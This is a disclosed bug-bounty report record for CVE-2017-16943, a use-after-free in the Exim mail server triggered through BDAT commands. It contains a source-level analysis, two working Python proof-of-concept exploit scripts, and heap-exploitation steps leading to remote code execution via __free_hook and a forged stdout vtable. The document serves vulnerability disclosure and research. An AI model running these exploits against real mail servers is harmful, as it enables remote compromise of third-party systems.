{
  "id": 296991,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTY5OTE=",
  "url": "https://hackerone.com/reports/296991",
  "title": "Exim use-after-free vulnerability while reading mail header involving BDAT commands",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2017-12-11T15:51:58.192Z",
  "submitted_at": "2017-12-11T15:51:58.192Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "mehqq",
    "url": "/mehqq",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/223/779/2feea3759da1e6d5b594b5096db68d21cf917004_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRSPJQEY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T125546Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIANREuSO5xRo5uYh9p3fj5lFZASOM0CJaqF9aRTyqP1tAiBMs6gYtXIgibXyOqYUXBJZxA%2Fdza4ke6K%2F%2F0b5E9m1RSqwBQh2EAMaDDAxMzYxOTI3NDg0OSIM8OmUCbC3Pqq1SyEDKo0F3cO4ThOa4uitsGZnpJd4WSWYKi0%2F5mL8qwHwgq3ZuZ1aNUqEK3JGtjDNNtehYQzb3K%2BVzvT15T5E0DeN3sE8NL7KIl3i0Dx5W04t%2FCwofuZVDH6Rwez2OIyLRGEiHKo%2FP%2FkbGO6J7x9mVhWTOKS2bFg4igbBGqP%2Bi2aedUT3vluiB7ukP1cc428RmdmCV%2BuhSI6mu%2Fx6zanZ8MjIY1iRcGFyRSvjl0iN9Apkcqbj2H8R4UNg8b2kqipVUPR0IhWE4Repf%2B6oHnySIQcgKlfP60eivKF7%2BDxEpCbVDsb91wMe67XzEaDtj4q3yEkaR59%2FnN0%2Fg51i8gvLHyAK2aB8UWfJhpojdnN%2FB%2BaF6aGM1Zep47eAH4cQQWhMZ2I26LKQhm7iwRj6IEHbgHd2m6nHPOKHU2uWuHo13GDorNeQWMI%2FABbIu1tC%2FBPGMydY2v4uUNIntKjUUw%2BXSGO9A9lk6BbiANo%2BTxvrgKzjhYstigi28K%2FJy2l%2B50z3nW5D8NMHVXHTF9%2FfZJj2T3gBRe9rfchTv6%2Bbpy1%2Bn8nOxmudj%2B9inUeddHC6rtgTt35Y1V%2FQuDeghaOCTLBIQIRUj2dXMLrSvM6ipTuqtOLpxyjWPKhlGteSd9sRZ2GulqFnPco4IJ18%2Fn03rD%2FZTFvntG5nnCfDUN1rKUSiHRLc%2Be2fxn1LToFrzjJFDRvOSJIM%2FpzLFcAYL8tTTyFBkIKfd049EasT8fD7XkmUkbP9SU%2Fz3oask16Cc%2FxTEDv733bE%2B2WRdqbzle4n0HY%2F8WFiXHg%2FcBG11MfaIEqM74wTZ5xO8lGQRD8qVunQROTT4innfbTfWRrrpjWEVYNiOx7p4%2BZ0qgpFMn9%2F3hcTkdABX%2BMwpcOtrgY6sgEIuPpZKWB6MctyieUs6Zf8b%2FX4IKPm%2BfhMeS2tI0il7r2OReIXdjDVkC4sQOPEZhbn%2BDfZAXOoMl6LPgx5C10nOg8D%2BTLxqQZt9rcPO7a6NY6DuIvhZo5c4RdVjEGuOfc%2FAROg4UmbOf0zkue94sBg8VslzPwR4H20rwyBYQqkWxtaGVbZKYCCbNb6IEpuSkgMadMJvwHOmUUOWS2k1Jnl6yQZixJKKroR7DQEK1J3Lebd&X-Amz-SignedHeaders=host&X-Amz-Signature=17162f6db05a05f3820b4b1d442342a49cf3941e45a4f5a161dcaca14209e87a",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRSPJQEY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T125546Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIANREuSO5xRo5uYh9p3fj5lFZASOM0CJaqF9aRTyqP1tAiBMs6gYtXIgibXyOqYUXBJZxA%2Fdza4ke6K%2F%2F0b5E9m1RSqwBQh2EAMaDDAxMzYxOTI3NDg0OSIM8OmUCbC3Pqq1SyEDKo0F3cO4ThOa4uitsGZnpJd4WSWYKi0%2F5mL8qwHwgq3ZuZ1aNUqEK3JGtjDNNtehYQzb3K%2BVzvT15T5E0DeN3sE8NL7KIl3i0Dx5W04t%2FCwofuZVDH6Rwez2OIyLRGEiHKo%2FP%2FkbGO6J7x9mVhWTOKS2bFg4igbBGqP%2Bi2aedUT3vluiB7ukP1cc428RmdmCV%2BuhSI6mu%2Fx6zanZ8MjIY1iRcGFyRSvjl0iN9Apkcqbj2H8R4UNg8b2kqipVUPR0IhWE4Repf%2B6oHnySIQcgKlfP60eivKF7%2BDxEpCbVDsb91wMe67XzEaDtj4q3yEkaR59%2FnN0%2Fg51i8gvLHyAK2aB8UWfJhpojdnN%2FB%2BaF6aGM1Zep47eAH4cQQWhMZ2I26LKQhm7iwRj6IEHbgHd2m6nHPOKHU2uWuHo13GDorNeQWMI%2FABbIu1tC%2FBPGMydY2v4uUNIntKjUUw%2BXSGO9A9lk6BbiANo%2BTxvrgKzjhYstigi28K%2FJy2l%2B50z3nW5D8NMHVXHTF9%2FfZJj2T3gBRe9rfchTv6%2Bbpy1%2Bn8nOxmudj%2B9inUeddHC6rtgTt35Y1V%2FQuDeghaOCTLBIQIRUj2dXMLrSvM6ipTuqtOLpxyjWPKhlGteSd9sRZ2GulqFnPco4IJ18%2Fn03rD%2FZTFvntG5nnCfDUN1rKUSiHRLc%2Be2fxn1LToFrzjJFDRvOSJIM%2FpzLFcAYL8tTTyFBkIKfd049EasT8fD7XkmUkbP9SU%2Fz3oask16Cc%2FxTEDv733bE%2B2WRdqbzle4n0HY%2F8WFiXHg%2FcBG11MfaIEqM74wTZ5xO8lGQRD8qVunQROTT4innfbTfWRrrpjWEVYNiOx7p4%2BZ0qgpFMn9%2F3hcTkdABX%2BMwpcOtrgY6sgEIuPpZKWB6MctyieUs6Zf8b%2FX4IKPm%2BfhMeS2tI0il7r2OReIXdjDVkC4sQOPEZhbn%2BDfZAXOoMl6LPgx5C10nOg8D%2BTLxqQZt9rcPO7a6NY6DuIvhZo5c4RdVjEGuOfc%2FAROg4UmbOf0zkue94sBg8VslzPwR4H20rwyBYQqkWxtaGVbZKYCCbNb6IEpuSkgMadMJvwHOmUUOWS2k1Jnl6yQZixJKKroR7DQEK1J3Lebd&X-Amz-SignedHeaders=host&X-Amz-Signature=70d8eec001e576c52f92ab07b8a3a80584a642d1cda3b48083886a716653dbe6"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2017-16943"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-11-12T23:45:11.583Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-10-13T23:45:11.243Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Original article is [here](https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/)\n\n# Use-after-free in receive_msg leads to RCE\n\n### Vulnerability Analysis\nTo explain this bug, we need to start with the memory management of exim. There is a series of functions starts with `store_` such as `store_get`, `store_release`, `store_reset`. These functions are used to manage dynamically allocated memory and improve performance. Its architecture is like the illustration below:\n![architecture of storeblock](https://d2mxuefqeaa7sj.cloudfront.net/s_250CBD95095D0019FAC82FED4F605A7EFB015920E271206EB018526E9DD7E3F0_1510286247190_exim+store+1.png)\n\nInitially, exim allocates a big storeblock (default 0x2000) and then cut it into **stores** when `store_get` is called, using global pointers to record the size of unused memory and where to cut in next allocation. Once the `current_block` is insufficient, it allocates a new block and appends it to the end of the chain, which is a linked list, and then makes `current_block` point to it. Exim maintains three `store_pool`, that is, there are three chains like the illustration above and every global variables are actually arrays.\nThis vulnerability is in `receive_msg` where exim reads headers: \n[receive.c: 1817 receive_msg](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1817)\n```c\n  if (ptr >= header_size - 4)\n    {\n    int oldsize = header_size;\n    /* header_size += 256; */\n    header_size *= 2;\n    if (!store_extend(next->text, oldsize, header_size))\n      {\n      uschar *newtext = store_get(header_size);\n      memcpy(newtext, next->text, ptr);\n      store_release(next->text);\n      next->text = newtext;\n      }\n    }\n```\nIt seems normal if the store functions are just like realloc, malloc and free. However, they are different and cannot be used in this way. When exim tries to **extend** store, the function `store_extend` checks whether the old store is the latest store allocated in `current_block`. It returns False immediately if the check is failed.\n[store.c: 276 store_extend](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/store.c#L276)\n```c\nif (CS ptr + rounded_oldsize != CS (next_yield[store_pool]) ||\n    inc > yield_length[store_pool] + rounded_oldsize - oldsize)\n  return FALSE;\n```\nOnce `store_extend` fails, exim tries to get a new store and release the old one. After we look into  `store_get` and store_release, we found that `store_get` returns a **store**, but `store_release` releases a **block** if the store is at the head of it. That is to say, if `next->text` points to the start the `current_block` and `store_get` cuts store inside it for `newtext`, then `store_release(next->text)` frees `next->text`, which is equal to `current_block`, and leaves `newtext` and `current_block` pointing to a freed memory area. Any further usage of these pointers leads to a use-after-free vulnerability. To trigger this bug, we need to make exim call `store_get` after `next->text` is allocated. This was impossible until BDAT command was introduced into exim. BDAT makes `store_get` reachable and finally leads to an RCE.\nExim uses [function pointers](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/globals.h#L136) to switch between different input sources, such as `receive_getc`, `receive_getbuf`. When receiving BDAT data, `receive_getc` is set to `bdat_getc` in order to check left chunking data size and to handle following command of BDAT. In `receive_msg`, exim also uses `receive_getc`. It loops to read data, and stores data into `next->text`, extends if insufficient.\n[receive.c: 1817 receive_msg](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1789)\n```c\nfor (;;)\n  {\n  int ch = (receive_getc)(GETC_BUFFER_UNLIMITED);\n  \n  /* If we hit EOF on a SMTP connection, it's an error, since incoming\n  SMTP must have a correct \".\" terminator. */\n\n  if (ch == EOF && smtp_input /* && !smtp_batched_input */)\n    {\n    smtp_reply = handle_lost_connection(US\" (header)\");\n    smtp_yield = FALSE;\n    goto TIDYUP;                       /* Skip to end of function */\n    }\n```\nIn `bdat_getc`, once the SIZE is reached, it tries to read the next BDAT command and raises error message if the following command is incorrect. \n[smtp_in.c: 628 bdat_getc](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L628)\n```c\n    case BDAT_CMD:\n      {\n      int n;\n\n      if (sscanf(CS smtp_cmd_data, \"%u %n\", &chunking_datasize, &n) < 1)\n\t{\n\t(void) synprot_error(L_smtp_protocol_error, 501, NULL,\n\t  US\"missing size for BDAT command\");\n\treturn ERR;\n\t}\n```\nIn exim, it usually calls `synprot_error` to raise error message, which also logs at the same time.\n[smtp_in.c: 628 bdat_getc](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L2984)\n```c\nstatic int\nsynprot_error(int type, int code, uschar *data, uschar *errmess)\n{\nint yield = -1;\n\nlog_write(type, LOG_MAIN, \"SMTP %s error in \\\"%s\\\" %s %s\",\n  (type == L_smtp_syntax_error)? \"syntax\" : \"protocol\",\n  string_printing(smtp_cmd_buffer), host_and_ident(TRUE), errmess);\n```\nThe log messages are printed by string_printing. This function ensures a string is printable. For this reason, it extends the string to transfer characters if any unprintable character exists, such as `'\\n'->'\\\\n'`. Therefore, it asks `store_get` for memory to store strings.\nThis store makes `    if (!store_extend(next->text, oldsize, header_size))` in `receive_msg` failed when next extension occurs and then triggers use-after-free.\n\n### Exploitation\nThe following is the Proof-of-Concept(PoC) python script of this vulnerability. This PoC controls the control flow of SMTP server and sets instruction pointer to `0xdeadbeef`. For fuzzing issue, we did change the runtime configuration of exim. As a result, this PoC works only when **dkim** is enabled. We use it as an example because the situation is less complicated. The version with default configuration is also exploitable, and we will discuss it at the end of this section.\n```python\n# CVE-2017-16943 PoC by meh at DEVCORE\n# pip install pwntools\nfrom pwn import *\n\nr = remote('127.0.0.1', 25)\n\nr.recvline()\nr.sendline(\"EHLO test\")\nr.recvuntil(\"250 HELP\")\nr.sendline(\"MAIL FROM:<meh@some.domain>\")\nr.recvline()\nr.sendline(\"RCPT TO:<meh@some.domain>\")\nr.recvline()\nr.sendline('a'*0x1250+'\\x7f')\nr.recvuntil('command')\nr.sendline('BDAT 1')\nr.sendline(':BDAT \\x7f')\ns = 'a'*6 + p64(0xdeadbeef)*(0x1e00/8)\nr.send(s+ ':\\r\\n')\nr.recvuntil('command')\nr.send('\\n')\n\nr.interactive()\n```\n\n1. Running out of `current_block`\n    In order to achieve code execution, we need to make the `next->text` get the first store of a block. That is, running out of `current_block` and making `store_get` allocate a new block. Therefore, we send a long message `'a'*0x1250+'\\x7f'` with an unprintable character to cut `current_block`, making `yield_length` less than 0x100.\n![](https://i.imgur.com/PaQWaAT.png)\n\n2. Starts BDAT data transfer\n    After that, we send BDAT command to start data transfer. At the beginning, `next` and `next->text` are allocated by `store_get`. \n    ![](https://i.imgur.com/C9PPhPY.png)\n    The function `dkim_exim_verify_init` is called sequentially and it also calls `store_get`. Notice that this function uses **ANOTHER `store_pool`**, so it allocates from heap without changing `current_block` which `next->text` also points to.\n[receive.c: 1734 receive_msg](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1734)\n    ```c\n    if (smtp_input && !smtp_batched_input && !dkim_disable_verify)\n      dkim_exim_verify_init(chunking_state <= CHUNKING_OFFERED);\n    ```\n\n3. Call `store_getc` inside `bdat_getc`\n    Then, we send a BDAT command without SIZE. Exim complains about the incorrect command and cuts the `current_block` with `store_get` in `string_printing`. \n![](https://i.imgur.com/5M1q0c4.png)\n\n4. Keep sending msg until extension and bug triggered\n    In this way, while we keep sending huge messages, `current_block` gets freed after the extension. In the malloc.c of glibc (so called ptmalloc), system manages a linked list of freed memory chunks, which is called unsortbin. Freed chunks are put into unsortbin if it is not the last chunk on the heap. In step 2, `dkim_exim_verify_init` allocated chunks after `next->text`. Therefore, this chunk is put into unsortbin and the pointers of linked list are stored into the first 16 bytes of chunk (on x86-64). The location written is exactly `current_block->next`, and therefore `current_block->next` is overwritten to `unsortbin` inside `main_arena` of libc (linked list pointer `fd` points back to `unsortbin` if no other freed chunk exists). \n![](https://i.imgur.com/xdGViKJ.png)\n\n5. Keep sending msg for the next extension\n    When the next extension occurs, `store_get` tries to cut from `main_arena`, which makes attackers able to overwrite all global variables below main_arena. \n6. Overwrite global variables in libc\n7. Finish sending message and trigger `free()`\n    In the PoC, we simply modified `__free_hook` and ended the line. Exim calls `store_reset` to reset the buffer and calls `__free_hook` in `free()`. At this stage, we successfully controlled instruction pointer `$rip`.\n    However, this is not enough for an RCE because the arguments are uncontrollable. As a result, we improved this PoC to modify both `__free_hook` and `_IO_2_1_stdout_`. We forged the vtable of `stdout` and set `__free_hook` to any call of `fflush(stdout)` inside exim. When the program calls fflush, it sets the first argument to stdout and jumps to a function pointer on the vtable of stdout. Hence, we can control both `$rip` and the content of first argument. \n    We consulted past CVE exploits and decided to call `expand_string`, which executes command with `execv` if we set the first argument to `${run{cmd}}`, and finally we got our RCE. \n    ![](https://i.imgur.com/2EkljvM.png)\n\n\n#### Exploit for default configured exim\nWhen dkim is disabled, the PoC above fails because `current_block` is the last chunk on heap. This makes the system merge it into a big chunk called **top chunk** rather than unsortbin.\nThe illustrations below describe the difference of heap layout:\n![](https://i.imgur.com/RQ9LVOb.png)\n![](https://i.imgur.com/X29oSsT.png)\n\nTo avoid this, we need to make exim allocate and free some memories before we actually start our exploitation. Therefore, we add some steps between step 1 and step 2.\n\nAfter running out of `current_block`:\n1. Use DATA command to send lots of data\n    Send huge data, make the chunk big and extend many times. After several extension, it calls `store_get` to retrieve a bigger store and then releases the old one. This repeats many times if the data is long enough. Therefore, we have a big chunk in unsortbin.\n2. End DATA transfer and start a new email\n    Restart to send an email with BDAT command after the heap chunk is prepared.\n3. Adjust `yield_length` again\n    Send invalid command with an unprintable charater again to cut the `current_block`.\n\nFinally the heap layout is like:\n![](https://i.imgur.com/b4phS3c.png)\n\nAnd now we can go back to the step 2 at the beginning and create the same situation. When `next->text` is freed, it goes back to unsortbin and we are able to overwrite libc global variables again.\nThe following is the PoC for default configured exim:\n```python\n# CVE-2017-16943 PoC by meh at DEVCORE\n# pip install pwntools\nfrom pwn import *\n\nr = remote('localhost', 25)\n\nr.recvline()\nr.sendline(\"EHLO test\")\nr.recvuntil(\"250 HELP\")\nr.sendline(\"MAIL FROM:<>\")\nr.recvline()\nr.sendline(\"RCPT TO:<meh@some.domain>\")\nr.recvline()\nr.sendline('a'*0x1280+'\\x7f')\nr.recvuntil('command')\nr.sendline('DATA')\nr.recvuntil('itself\\r\\n')\nr.sendline('b'*0x4000+':\\r\\n')\nr.sendline('.\\r\\n')\nr.sendline('.\\r\\n')\nr.recvline()\nr.sendline(\"MAIL FROM:<>\")\nr.recvline()\nr.sendline(\"RCPT TO:<meh@some.domain>\")\nr.recvline()\nr.sendline('a'*0x3480+'\\x7f')\nr.recvuntil('command')\nr.sendline('BDAT 1')\nr.sendline(':BDAT \\x7f')\ns = 'a'*6 + p64(0xdeadbeef)*(0x1e00/8)\nr.send(s+ ':\\r\\n')\nr.send('\\n')\nr.interactive()\n```\n\nA demo of our exploit is as below.\n![](https://i.imgur.com/jumGJMG.png)\nNote that we have not found a way to leak memory address and therefore we use heap spray instead. It requires another information leakage vulnerability to overcome the PIE mitigation on x86-64.\n\n## Impact\n\nRemote code execution on remote mail server, affecting over 500k mail servers.",
  "weakness": {
    "id": 50,
    "name": "Use After Free"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-11-12T23:45:11.314Z",
  "allow_singular_disclosure_after": -134226634.9303495,
  "singular_disclosure_allowed": true,
  "vote_count": 5,
  "voters": [
    "mehqq",
    "checkm50",
    "base_64",
    "japz",
    "srikar301"
  ],
  "severity": {
    "rating": "critical",
    "score": 9.8,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 84121,
    "asset_type": "OTHER",
    "asset_identifier": "IBB (Legacy)",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
